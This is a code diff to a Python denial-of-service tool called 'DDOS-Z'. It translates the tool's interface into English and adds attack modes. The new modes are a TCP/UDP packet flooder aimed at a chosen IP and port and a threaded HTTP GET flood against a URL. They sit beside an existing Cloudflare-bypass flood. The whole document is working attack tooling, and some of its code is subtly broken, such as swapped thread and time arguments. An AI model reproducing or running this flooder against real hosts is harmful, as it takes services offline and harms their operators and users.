@@ -18,40 +18,40 @@ def countdown(t):
     while True:
         if (until - datetime.datetime.now()).total_seconds() > 0:
             stdout.flush()
-            stdout.write("\r "+Fore.RED+">>>"+Fore.WHITE+" Proses => " + str((until - datetime.datetime.now()).total_seconds()) + " sisa waktu ")
+            stdout.write("\r "+Fore.RED+">>>"+Fore.WHITE+" Time status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
         else:
             stdout.flush()
-            stdout.write("\r"+Fore.RED+">>>"+Fore.WHITE+" SELESAI "+Fore.RED+"<<<                                    \n")
+            stdout.write("\r"+Fore.RED+"> "+Fore.GREEN+" DONE "+Fore.RED+" <                                    \n")
             return
 
 def get_info_l7():
     stdout.write(""+Fore.RED+">>"+Fore.WHITE+"URL      "+Fore.RED+": "+Fore.WHITE)
     target = input()
-    stdout.write(""+Fore.RED+">>"+Fore.WHITE+"Thread   "+Fore.RED+": "+Fore.WHITE)
+    stdout.write(""+Fore.RED+">>"+Fore.WHITE+"THREAD   "+Fore.RED+": "+Fore.WHITE)
     thread = input()
     stdout.write(""+Fore.RED+">>"+Fore.WHITE+"TIME     "+Fore.RED+": "+Fore.WHITE)
     t = input()
     return target, thread, t
 
 def get_info_l4():
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    stdout.write(""+Fore.RED+">>"+Fore.WHITE+"IP      "+Fore.RED+": "+Fore.WHITE)
     target = input()
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    stdout.write(""+Fore.RED+">>"+Fore.WHITE+"PORT    "+Fore.RED+": "+Fore.WHITE)
     port = input()
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    stdout.write(""+Fore.RED+">>"+Fore.WHITE+"THREAD  "+Fore.RED+": "+Fore.WHITE)
     thread = input()
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    stdout.write(""+Fore.RED+">>"+Fore.WHITE+"TIME    "+Fore.RED+": "+Fore.WHITE)
     t = input()
     return target, port, thread, t
 
 def title():
     system('clear')
-    stdout.write("                                    \n")
     stdout.write("\n")
-    stdout.write(""+Fore.RED   +">>>>>  WELCOME    TO    DDOS-Z  <<<<<\n")
-    stdout.write("\n")
-    stdout.write(""+Fore.GREEN+"Pilih Metode (cfb)  or  (sky)\n")
-    stdout.write(""+Fore.RED+">>> PASTIKAN TERHUBUNG INTERNET <<<\n")
+    stdout.write(""+Fore.BLUE+"════════════DDOS-Z════════════════════╗\n")
+    stdout.write(""+Fore.RED+"> Must be connected to the internet <\n\n")
+    stdout.write(""+Fore.GREEN+"Method\n> tcp  --tcp attack\n> cfb  --bypass CF attack\n> sky  --sky method without proxy\n> get  --get request attack\n\n")
+    stdout.write(""+Fore.CYAN+"credit  :  github.com/zaczxx/ddos\n")
+    stdout.write(""+Fore.BLUE+"═══════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
 def command():
@@ -60,7 +60,7 @@ def command():
     if command == "cls" or command == "clear" or command == "Clear" or command == "CLEAR":
         clear()
         title()
-    elif command == "cfb" or command == "CFB":
+    elif command == "cfb" or command == "CFB" or command == "Cfb":
         target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
@@ -74,6 +74,20 @@ def command():
         timer.join()
     elif command == "exit" or command == "Exit" or command == "EXIT":
         exit()
+    elif command == "tcp" or command == "TCP" or command == "Tcp":
+        target, port, thread, t = get_info_l4()
+        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+    elif command == "get" or command == "GET" or command == "Get":
+        target, thread, t = get_info_l7()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchRAW(target, thread, t)
+        timer.join()
+    else:
+        stdout.write(Fore.GREEN+"Unknown command\n")
 
 #region CFB
 def LaunchCFB(url, th, t):
@@ -94,7 +108,50 @@ def AttackCFB(url, until_datetime, scraper):
         except:
             pass
 #endregion       
-                        
+
+def runflooder(host, port, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    rand = random._urandom(4096)
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
+            thd.start()
+        except:
+            pass
+
+def flooder(host, port, rand, until_datetime):
+    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            sock.sendto(rand, (host, int(port)))
+        except:
+            sock.close()
+            pass
+
+
+def runsender(host, port, th, t, payload):
+    if payload == "":
+        payload = random._urandom(60000)
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    #payload = Payloads[method]
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=sender, args=(host, port, until, payload))
+            thd.start()
+        except:
+            pass
+
+def sender(host, port, until_datetime, payload):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            sock.sendto(payload, (host, int(port)))
+        except:
+            sock.close()
+            pass
+            
+#endregion
 #region testzone
 def attackSKY(url, timer, threads):
     for i in range(int(threads)):
@@ -160,6 +217,22 @@ def LaunchSTELLAR(url, timer):
                 s.close()
         except:
             s.close()
+def LaunchRAW(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackRAW, args=(url, until))
+            thd.start()
+        except:
+            pass
+
+def AttackRAW(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            requests.get(url)
+            requests.get(url)
+        except:
+            pass
 #endregion
 if __name__ == '__main__':
     init(convert=True)
